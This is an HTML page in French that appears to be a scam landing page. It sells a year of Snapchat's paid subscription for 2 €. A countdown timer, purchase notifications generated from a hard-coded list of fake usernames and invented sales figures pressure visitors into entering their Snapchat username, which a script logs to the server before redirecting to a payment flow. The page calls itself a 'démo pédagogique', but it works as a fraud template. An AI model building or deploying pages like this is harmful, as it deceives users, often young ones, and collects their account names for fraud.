<!doctype html>
<html lang="fr">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>SnapMax — 1 an de Snap+</title>
  <link rel="icon" type="image/png" href="/logo.png?v=2" />
  <style>
    :root{
      --bg:#0b0b10;--panel:#0f1018;--panel2:#0d0e15;--line:#24283a;--text:#f7f7fb;--muted:#a3a3b2;
      --grad1:#ffd36e;--grad2:#ff79d1;--ok:#23c77d;--radius:18px;
    }
    *{box-sizing:border-box}
    html,body{margin:0;background:var(--bg);color:var(--text);font:16px/1.55 system-ui,-apple-system,Segoe UI,Roboto,Inter}
    a{color:#7ecbff;text-decoration:none}
    .wrap{max-width:1100px;margin:auto;padding:20px}
    .header{position:sticky;top:0;z-index:40;background:linear-gradient(180deg,#0b0b10ee,#0b0b1000);backdrop-filter:saturate(120%) blur(6px);border-bottom:1px solid #171a28}
    .row{display:flex;align-items:center;justify-content:space-between;gap:12px}
    .brand{display:flex;align-items:center;gap:10px}
    .brand span{font-weight:900;letter-spacing:.2px;background:linear-gradient(90deg,var(--grad1),var(--grad2));-webkit-background-clip:text;background-clip:text;color:transparent}
    .btn{display:inline-flex;align-items:center;gap:8px;border:1px solid #ffffff22;background:#ffffff10;color:#fff;padding:10px 14px;border-radius:12px;cursor:pointer}
    .btn:hover{background:#ffffff18}
    .hero{margin-top:18px}
    h1{margin:10px 0 6px;font-size:44px;line-height:1.15}
    .muted{color:var(--muted)}
    .kpi-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:14px;margin:18px 0}
    @media(max-width:980px){.kpi-grid{grid-template-columns:1fr 1fr}}
    .kpi{border:1px solid var(--line);background:var(--panel2);border-radius:16px;padding:18px;text-align:center}
    .kpi .big{font-size:26px;font-weight:900}
    .kpi .sub{font-size:12px;color:var(--muted);margin-top:6px}

    .card{border:1px solid var(--line);background:var(--panel2);border-radius:var(--radius);padding:16px}
    .buy-list{margin-top:8px;border:1px solid var(--line);background:#0f1119;border-radius:14px;overflow:hidden}
    .buy-row{display:flex;align-items:center;gap:12px;padding:12px 14px;border-top:1px solid #1b1e2a}
    .buy-row:first-child{border-top:0}
    .badge-dot{width:26px;height:26px;border-radius:50%;background:#f2a3a3;color:#000;display:flex;align-items:center;justify-content:center;font-weight:800}
    .bname{font-weight:700}
    .btime{font-size:12px;color:var(--muted)}
    .chip{margin-left:auto;font-size:12px;border:1px solid #214d33;background:#163223;color:#b3ffd6;border-radius:999px;padding:6px 10px}

    .features{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;margin-top:16px}
    @media(max-width:980px){.features{grid-template-columns:1fr}}
    .feature{border:1px solid var(--line);background:#0f1119;border-radius:14px;padding:16px}

    .offer{margin-top:18px;border:1px solid var(--line);background:var(--panel);border-radius:16px;padding:16px}
    .count{font-size:32px;font-weight:900;letter-spacing:1px}
    .input{width:100%;padding:12px 14px;border-radius:12px;border:1px solid var(--line);background:#0c0d14;color:#fff;margin-bottom:20px}
    .cta{
      display:block;
      margin-top:24px;
      background:linear-gradient(90deg,var(--grad1),var(--grad2));
      color:#212127;
      border:0;
      padding:16px;
      border-radius:14px;
      font-weight:900;
      cursor:pointer;
      width:100%;
      text-align:center;
      font-size:18px;
    }
    .cta:hover{filter:brightness(1.05)}

    /* Toasts */
    .toasts{position:fixed;right:16px;bottom:16px;display:grid;gap:8px;width:min(320px,90vw);z-index:50}
    .toast{display:flex;gap:10px;align-items:center;background:#0f1712;border:1px solid #2a3b30;color:#d9ffe7;padding:10px 12px;border-radius:12px;box-shadow:0 8px 30px #0006;opacity:0;transform:translateY(10px);transition:.3s}
    .toast.show{opacity:1;transform:translateY(0)}
    .ok{width:18px;height:18px;border-radius:50%;background:var(--ok);flex:0 0 18px}
  </style>
</head>
<body>
  <!-- Header -->
  <div class="header">
    <div class="wrap row">
      <div class="brand">
        <img src="/logo.png" alt="Logo" style="height:28px;width:auto;border-radius:8px;display:block;">
        <span>SnapMax</span>
      </div>
      <a class="btn" href="#acheter">Obtenir Snap+ →</a>
    </div>
  </div>

  <main class="wrap">
    <section class="hero">
      <h1>Récupère 1 an de Snap+</h1>
      <p class="muted">Design d’origine conservé, offre 2 €, et preuves sociales.</p>

      <!-- KPIs -->
      <div class="kpi-grid">
        <div class="kpi"><div class="big">2€</div><div class="sub">Offre limitée</div></div>
        <div class="kpi"><div class="big">+ 3 129</div><div class="sub">Récupérations</div></div>
        <div class="kpi"><div class="big">~2 min</div><div class="sub">Délai moyen</div></div>
        <div class="kpi"><div class="big">4.8/5</div><div class="sub">Satisfaction</div></div>
      </div>

      <!-- “Ils viennent d’acheter” -->
      <div class="card">
        <div class="row" style="justify-content:space-between">
          <div class="row" style="gap:10px;align-items:center">
            <div style="font-weight:800">Ils viennent d’acheter</div>
            <div class="muted" style="font-size:12px">Preuves sociales en temps réel</div>
          </div>
          <div class="chip">+ 3 129</div>
        </div>
        <div class="buy-list" id="buy-list"></div>
      </div>

      <!-- Features -->
      <div class="features">
        <div class="feature"><h3>Activation rapide</h3><p class="muted">Accès en quelques minutes après confirmation.</p></div>
        <div class="feature"><h3>Priorité premium</h3><p class="muted">Certaines fonctionnalités prioritaires.</p></div>
        <div class="feature"><h3>Sans engagement</h3><p class="muted">Arrête quand tu veux, en 2 clics.</p></div>
      </div>

      <!-- Offre + formulaire -->
      <div class="offer" id="acheter">
        <div class="row" style="gap:10px;align-items:center;margin-bottom:10px">
          <div style="display:flex;align-items:center;gap:8px">
            <span style="color:#ffae6a">⚡</span><strong>OFFRE LIMITÉE — PLUS QUE</strong>
          </div>
        </div>
        <div class="count" id="count">00:15:00</div>
        <div style="height:1px;background:#1a1d2a;margin:12px 0"></div>
        <div class="row" style="gap:10px;align-items:center;margin:6px 0 10px">
          <div class="kpi" style="flex:0 0 auto;padding:8px 12px">
            <div class="big" style="font-size:20px">2€</div>
          </div>
          <div class="muted">au lieu de 47,99€ pour 1 an complet</div>
        </div>

        <input id="snuser" class="input" placeholder="Nom d’utilisateur Snapchat (ex: enzo_lol)">
        <a id="cta" href="#" class="cta">Obtenir Snap+ maintenant 🔒</a>

        <p class="muted" style="font-size:12px;margin-top:12px">Démo pédagogique — non affiliée à Snap Inc.</p>
      </div>
    </section>
  </main>

  <!-- Toasts -->
  <div class="toasts" id="toasts"></div>

  <script>
    (function countdown(dur=15*60){
      let s=dur; const el=document.getElementById("count");
      function tick(){
        const m=Math.floor(s/60), ss=String(s%60).padStart(2,"0");
        el.textContent=`${String(Math.floor(m/60)).padStart(2,"0")}:${String(m%60).padStart(2,"0")}:${ss}`;
        if(s>0){ s--; setTimeout(tick,1000); }
      }
      tick();
    })();

    const LOG_API = "/api/log";
    async function sendLog(evt){
      try{
        await fetch(LOG_API,{
          method:"POST",
          headers:{ "Content-Type":"application/json" },
          body: JSON.stringify({ ...evt, path: location.pathname })
        });
      }catch(e){}
    }

    (function attachCTA(){
      const btn = document.getElementById("cta");
      const input = document.getElementById("snuser");
      if(!btn || !input) return;

      btn.addEventListener("click", async (e)=>{
        e.preventDefault();
        const u = (input.value || "").trim();
        if(!u){ alert("Entre ton pseudo Snapchat 🙂"); return; }
        await sendLog({ event_type:"checkout_start", user_name:u });
        window.location.href = "/process.html?u=" + encodeURIComponent(u);
      });
    })();

    const starters = [
      {name:"maria_e", ago:"il y a 8m"},
      {name:"emma-k", ago:"il y a 10m"},
      {name:"kylianx", ago:"il y a 12m"},
      {name:"enzo_lol", ago:"il y a 10s"},
    ];
    const buyList = document.getElementById("buy-list");
    function row(name,ago){
      const initial = (name[0]||"?").toUpperCase();
      return `
        <div class="buy-row">
          <div class="badge-dot">${initial}</div>
          <div>
            <div class="bname">${name}</div>
            <div class="btime">${ago}</div>
          </div>
          <div class="chip">✓ Snap+</div>
        </div>`;
    }
    function renderList(){ buyList.innerHTML = starters.map(x=>row(x.name,x.ago)).join(""); }
    renderList();

    const toastsBox = document.getElementById("toasts");
    const fakeNames = ["enzo_lol","mila_snap","axel.93","nora_dev","yanisx","lea__","momo.z","clara_t","imad75","sarah_2"];
    function showToast(text){
      const el=document.createElement("div");
      el.className="toast";
      el.innerHTML=`<div class="ok"></div><div>${text}</div>`;
      toastsBox.appendChild(el);
      requestAnimationFrame(()=>el.classList.add("show"));
      setTimeout(()=>{el.classList.remove("show"); setTimeout(()=>el.remove(),300);}, 4000);
    }
    (function loopToasts(){
      setInterval(()=>{
        const name = fakeNames[Math.floor(Math.random()*fakeNames.length)];
        showToast(`@${name} vient d'acheter 1 an Snap+`);
      }, 6000 + Math.random()*6000);
    })();
  </script>
  <script>
  // Bouton "Payer maintenant"
  const payBtn = document.getElementById("payNow");
  if (payBtn) {
    payBtn.addEventListener("click", function(e){
      e.preventDefault();
      // Redirection vers ton vrai domaine
      window.location.href = window.location.origin + "/confirmation.html";
    });
  }

  // Si le bouton est dans un formulaire
  const form = document.querySelector("form");
  if (form) {
    form.addEventListener("submit", function(e){
      e.preventDefault();
      window.location.href = window.location.origin + "/confirmation.html";
    });
  }
</script>
</body>
</html>
